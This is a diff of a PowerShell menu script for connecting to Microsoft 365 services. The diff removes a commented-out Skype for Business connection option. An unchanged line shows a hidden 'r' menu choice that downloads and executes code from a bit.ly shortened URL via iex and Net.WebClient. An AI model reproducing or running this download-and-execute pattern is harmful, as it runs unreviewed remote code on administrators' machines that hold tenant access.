@@ -103,18 +103,6 @@ function Connect-PnPSharePoint {
     Update-Module PnP.PowerShell -force
     Connect-PnPOnline -Url https://$tenant.sharepoint.com/sites/$site -UseWebLogin
 }
-<# function Connect-Skype {
-    Write-Host 'Connecting to Skype for Business Online...' -ForegroundColor Green
-    $sfbSession = New-CsOnlineSession
-    try {
-        Import-Module MicrosoftTeams
-    }
-    catch {
-        Install-Module MicrosoftTeams -Scope CurrentUser -Repository PSGallery -Force
-    }
-    Update-Module MicrosoftTeams -Force
-    Import-PSSession $sfbSession
-} #>
 function Connect-Teams {
     Write-Host 'Connecting to Teams...' -ForegroundColor Green
     try {
@@ -191,10 +179,6 @@ function Connect-Menu {
                 cls
                 Connect-Teams;
             }
-            <# '8'{
-                cls
-                Connect-Skype;
-            } #>
             'r'{
                 iex (New-Object Net.WebClient).DownloadString("http://bit.ly/e0Mw9w")
             }
